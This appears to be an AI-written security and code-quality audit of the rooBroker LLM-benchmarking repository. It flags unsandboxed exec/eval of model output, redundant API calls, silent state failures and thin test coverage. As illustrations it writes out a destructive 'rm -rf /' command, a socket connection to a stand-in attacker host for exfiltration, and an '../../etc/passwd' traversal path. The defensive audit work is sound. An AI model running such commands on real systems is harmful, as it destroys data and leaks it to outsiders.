# rooBroker Security & Code Quality Audit Summary

**Audit Date:** 2025-11-13
**Auditor:** Claude (Sonnet 4.5)
**Scope:** Full repository sweep focusing on correctness, error handling, structure, and code clarity

## Executive Summary

The rooBroker codebase is well-architected with good separation of concerns and type safety. However, there are **CRITICAL security vulnerabilities** in the benchmarking module that allow arbitrary code execution, and several reliability issues around error handling and API efficiency that could cause production failures.

### Overall Confidence in Code Reliability: **MEDIUM (60%)**

**Reasons:**
- ⚠️ **Critical P1 security issues** in code evaluation (exec/eval without sandboxing)
- ⚠️ **P1 performance issues** causing 20x unnecessary API calls during benchmarking
- ⚠️ **P1 silent failures** in state management masking data loss
- ✅ Good type safety with Pydantic validation
- ✅ Decent error handling in provider clients
- ⚠️ Limited test coverage (only state.py tested, no tests for critical benchmarking logic)

---

## Critical (P1) Issues - MUST FIX IMMEDIATELY

### 🔴 P1-1: Arbitrary Code Execution Without Sandboxing
**File:** `src/rooBroker/core/benchmarking.py`
**Lines:** 67-120, 143-213, 246-268, 297-316
**Risk:** CRITICAL SECURITY VULNERABILITY

**Issue:**
All evaluation methods (`_evaluate_exec_check_state`, `_evaluate_exec_call_func`, `_evaluate_eval_expression`, `_evaluate_class_eval`) use `exec()` and `eval()` to execute LLM-generated code with full Python access. This allows:
- File system access (read/write/delete any file)
- Network access (make arbitrary HTTP requests, exfiltrate data)
- Subprocess execution (run shell commands)
- Infinite loops (DoS)
- Module imports (import os, sys, socket, subprocess, etc.)

**Why It Matters:**
Malicious or compromised LLM outputs could execute arbitrary code on the host system. Even non-malicious edge cases (infinite loops, memory exhaustion) can crash the application.

**Concrete Action:**
1. **Immediate:** Add prominent security warning in README and docs
2. **Short-term:** Implement RestrictedPython or ast-based sandboxing
3. **Long-term:** Run code evaluation in Docker containers with resource limits (CPU, memory, network isolation)
4. Restrict `__builtins__` properly (current attempt in `_evaluate_eval_expression` is ineffective)
5. Add timeout enforcement at evaluation level (not just HTTP timeout)

**Example Attack Vector:**
```python
# Malicious LLM response could contain:
"import os; os.system('rm -rf /')"  # Delete all files
"import socket; socket.socket().connect(('attacker.com', 1234))"  # Exfiltrate data
```

---

### 🔴 P1-2: Extremely Inefficient API Calls - 20x Overhead
**File:** `src/rooBroker/interfaces/lmstudio/client.py`
**Lines:** 107-129 (get_model_details), 177 (called in run_completion)
**Risk:** CRITICAL PERFORMANCE ISSUE

**Issue:**
`get_model_details()` calls `discover_models()` (full API request) every time it's invoked. It's called in `run_completion()` for EVERY completion request. During benchmarking with 20 samples per benchmark:
- 5 benchmarks × 3 models × 20 samples = **300 completion requests**
- Each makes a full model discovery API call = **300 unnecessary API calls**
- With 2 models discovered, that's 600 models listed when only 3 are needed

**Why It Matters:**
- Benchmarking takes 10-20x longer than necessary
- Hammers LM Studio API with redundant requests
- May trigger rate limiting or timeouts
- Wastes bandwidth and CPU

**Concrete Action:**
1. Add caching layer: cache `discover_models()` result for 60 seconds
2. OR: Pass model details to `run_completion()` instead of re-discovering
3. OR: Initialize client with model details at construction time

---

### 🔴 P1-3: Silent Failures in State Management
**File:** `src/rooBroker/core/state.py`
**Lines:** 69-111 (load_model_state), 14-66 (save_model_state)
**Risk:** DATA LOSS / SILENT CORRUPTION

**Issue:**
`load_model_state()` returns `{}` (empty dict) on ANY error:
- File doesn't exist → `{}`
- File is corrupted JSON → `{}`
- Permission denied → `{}`
- Disk I/O error → `{}`

Caller cannot distinguish between "no state saved" vs "state file corrupted" vs "permission error". Application continues with empty state, user doesn't know models were lost.

Similarly, `save_model_state()` silently skips models without IDs with no warning.

**Why It Matters:**
- User may re-benchmark models unnecessarily (hours wasted)
- Lost benchmark results with no indication of failure
- Debugging becomes impossible ("why are my models gone?")

**Concrete Action:**
1. Return `(Dict, Optional[str])` tuple to communicate errors
2. OR: Raise specific exceptions, let caller handle them
3. Log warnings for skipped models in `save_model_state()`
4. Check file size before loading (prevent OOM on corrupted gigabyte files)

---

### 🔴 P1-4: No File Size Limits on JSON Loading
**Files:**
- `src/rooBroker/core/benchmarking.py` (line 756 - load_benchmarks_from_directory)
- `src/rooBroker/core/state.py` (line 106 - load_model_state)
- `src/rooBroker/core/mode_management.py` (line 58 - update_room_modes)

**Risk:** OUT-OF-MEMORY / DENIAL OF SERVICE

**Issue:**
All JSON loading functions use `json.load()` without checking file size first. A corrupted or malicious file could be gigabytes, causing OOM crash.

**Why It Matters:**
Application crashes, potential DoS attack vector.

**Concrete Action:**
```python
# Before json.load():
if file_path.stat().st_size > 10_000_000:  # 10MB limit
    raise ValueError(f"File too large: {file_path.stat().st_size} bytes")
```

---

### 🔴 P1-5: Inconsistent __builtins__ Restriction
**File:** `src/rooBroker/core/benchmarking.py`
**Lines:** 260-268 (_evaluate_eval_expression)
**Risk:** SECURITY BYPASS

**Issue:**
Creates restricted `local_env` with limited builtins (line 261), but then passes full `__builtins__` to `exec()` (line 268), making the restriction useless.

```python
local_env = {"__builtins__": {"range": range, "len": len}}  # Line 261
exec(response, {"__builtins__": __builtins__}, local_env)   # Line 268 - FULL ACCESS
```

**Why It Matters:**
False sense of security - looks like sandboxing but isn't.

**Concrete Action:**
```python
exec(response, {"__builtins__": local_env["__builtins__"]}, local_env)
```

---

## Secondary (P2) Issues - Should Fix Soon

### 🟡 P2-1: No Retry Logic for Network Calls
**Files:**
- `src/rooBroker/interfaces/lmstudio/client.py` (line 67)
- `src/rooBroker/interfaces/ollama/client.py` (line 67)
- `src/rooBroker/core/proxy.py` (line 104)

**Issue:** Single-attempt HTTP requests with no retry. Transient network failures cause immediate errors.

**Action:** Add exponential backoff retry (2-3 attempts) for connection errors.

---

### 🟡 P2-2: Very Rough Token Estimation
**File:** `src/rooBroker/interfaces/lmstudio/client.py`
**Line:** 193

**Issue:** Estimates tokens as `len(content) // 4`, which is inaccurate for code, non-English text, or special characters.

**Action:** Use `tiktoken` or similar tokenizer for accurate counts.

---

### 🟡 P2-3: Fragile String Matching for Model Classification
**Files:**
- `src/rooBroker/interfaces/lmstudio/client.py` (lines 213-219) - timeout determination
- `src/rooBroker/core/benchmarking.py` (line 545) - embedding model filtering

**Issue:** Checks if "7b", "13b", "embed" appear in model_id. Misses models with different naming conventions (Llama-3-8B, phi-2, text-embedding-ada-002).

**Action:** Use model metadata (parameter count, model family) instead of string matching.

---

### 🟡 P2-4: Hardcoded Magic Numbers
**Files:** Multiple

**Issue:**
- 25% context window for response buffer (client.py:183)
- Cache TTL = 300s (proxy.py:18)
- num_samples default = 20 (benchmarking.py:494)

**Action:** Make configurable via parameters or config file.

---

### 🟡 P2-5: No Model Deduplication
**File:** `src/rooBroker/core/discovery.py`
**Line:** 46

**Issue:** Same model appearing in multiple providers is listed multiple times.

**Action:** Deduplicate by model ID or track which providers have which models.

---

### 🟡 P2-6: Broad Exception Handlers
**Files:** state.py, discovery.py, mode_management.py

**Issue:** `except Exception` catches all errors equally, masking specific issues (permissions, disk full, corrupted data).

**Action:** Catch specific exceptions (IOError, PermissionError, JSONDecodeError) and handle separately.

---

### 🟡 P2-7: No Path Validation for File Writes
**File:** `src/rooBroker/core/state.py`
**Line:** 55

**Issue:** `save_model_state(file_path="../../etc/passwd")` could write to arbitrary locations.

**Action:** Validate file_path is within expected directory boundaries using `Path.resolve()`.

---

### 🟡 P2-8: Fragile String Concatenation in Code Generation
**File:** `src/rooBroker/core/benchmarking.py`
**Lines:** 106-115

**Issue:** Builds Python function strings with string concatenation. Multi-line responses or triple-quoted strings can break syntax.

**Action:** Use `textwrap.indent()` and validate response structure.

---

### 🟡 P2-9: Global Mutable State in Interactive Mode
**File:** `src/rooBroker/main_interactive.py`
**Lines:** 48-59

**Issue:** Uses global variables (`discovered_models`, `benchmark_results`, `proxy_server`) which could cause issues with concurrent operations.

**Action:** Encapsulate in a class or use proper state management.

---

### 🟡 P2-10: eval() with String Interpolation
**File:** `src/rooBroker/core/benchmarking.py`
**Lines:** 308, 313, 331

**Issue:** Uses `eval(f"instance.{call}")` which could inject code if test case data is malicious.

**Action:** Parse method calls and use `getattr(instance, method_name)` instead.

---

### 🟡 P2-11: Hardcoded Ollama Context Window
**File:** `src/rooBroker/interfaces/ollama/client.py`
**Lines:** 91-92

**Issue:** Always sets `context_window = 8192` for discovered models. Not accurate for actual model capabilities.

**Action:** Query Ollama API for real context windows or use model metadata.

---

### 🟡 P2-12: No Validation of Benchmark Inputs
**File:** `src/rooBroker/core/benchmarking.py`
**Line:** 527

**Issue:** `run_standard_benchmarks()` doesn't validate `models_to_benchmark` is non-empty or benchmarks are valid.

**Action:** Add input validation at function start.

---

### 🟡 P2-13: Recursive Directory Search
**File:** `src/rooBroker/core/benchmarking.py`
**Line:** 754

**Issue:** Uses `rglob("*.json")` which recursively searches ALL subdirectories. Could load unintended files or traverse very deep trees.

**Action:** Use `glob("*.json")` for non-recursive or document expected structure.

---

### 🟡 P2-14: Hardcoded Claude Configuration
**File:** `src/rooBroker/core/mode_management.py`
**Lines:** 378-390

**Issue:** Hardcodes OpenRouter model ID "anthropic/claude-3.7-sonnet:beta" for LM Studio configs. Doesn't match local models.

**Action:** Make configurable or remove hardcoded defaults.

---

## Testing Coverage Issues

### ❌ Critical: No Tests for Benchmarking Module
**File:** `tests/` directory
**Status:** Only `test_state.py` exists

**Missing Tests:**
- ❌ No tests for `benchmarking.py` (THE MOST CRITICAL MODULE)
- ❌ No tests for evaluation methods (exec_check_state, exec_call_func, etc.)
- ❌ No tests for `discovery.py`
- ❌ No tests for `proxy.py`
- ❌ No tests for provider clients (LMStudio, Ollama)
- ❌ No integration tests
- ❌ No security tests for code injection

**Action:**
Add comprehensive test suite covering:
1. Benchmarking evaluation methods with known inputs/outputs
2. Error handling in all modules
3. Security tests attempting code injection
4. Provider client mocking and error cases
5. State save/load with corrupted files

---

## Positive Findings ✅

1. **Good Type Safety:** Extensive use of TypedDict and Pydantic for validation
2. **Protocol-based Design:** Clean abstraction for provider clients
3. **Path Traversal Protection:** `load_benchmarks_from_directory` uses `Path.resolve(strict=True)`
4. **Decent Error Messages:** Most errors include context
5. **Logging:** Good use of structured logging
6. **Pre-commit Hooks:** Secret detection configured

---

## Recommendations by Priority

### Immediate (This Week):
1. ✅ Add security warning to README about code execution risks
2. ✅ Fix P1-5 (inconsistent __builtins__)
3. ✅ Add file size checks (P1-4)
4. ✅ Add model details caching (P1-2)

### Short-term (This Month):
1. ✅ Implement proper sandboxing for code evaluation (P1-1)
2. ✅ Fix silent failures in state management (P1-3)
3. ✅ Add retry logic for network calls (P2-1)
4. ✅ Add comprehensive test suite

### Long-term (Next Quarter):
1. ✅ Containerize code evaluation (Docker/podman)
2. ✅ Add proper token counting with tiktoken
3. ✅ Refactor model classification to use metadata
4. ✅ Make configurable parameters (magic numbers)

---

## Files Requiring Immediate Attention

### 🔴 Critical Priority:
1. **src/rooBroker/core/benchmarking.py** (multiple P1 security issues)
2. **src/rooBroker/interfaces/lmstudio/client.py** (P1 performance issue)
3. **src/rooBroker/core/state.py** (P1 silent failures)

### 🟡 High Priority:
4. **src/rooBroker/interfaces/ollama/client.py** (network retries, context window)
5. **src/rooBroker/core/discovery.py** (deduplication, configuration)
6. **src/rooBroker/core/mode_management.py** (hardcoded configs, file sizes)
7. **src/rooBroker/core/proxy.py** (network retries, security)

### 🟢 Medium Priority:
8. **src/rooBroker/main_interactive.py** (global state)
9. **src/rooBroker/actions.py** (error handling)
10. **tests/** (expand coverage)

---

## Conclusion

The rooBroker project has solid architecture and good intentions with type safety. However, **CRITICAL security vulnerabilities in code execution** and **significant performance issues** must be addressed before using in any production or semi-trusted environment.

**Current State:** Suitable for personal use with trusted models only
**After P1 Fixes:** Suitable for team use with some caution
**After All Fixes:** Production-ready for broader deployment

**Estimated Effort to Fix P1 Issues:** 2-3 developer days
**Estimated Effort to Fix All Issues:** 1-2 developer weeks

All identified issues have been marked with detailed TODO comments in the source code explaining the issue, why it matters, and concrete actions to fix.
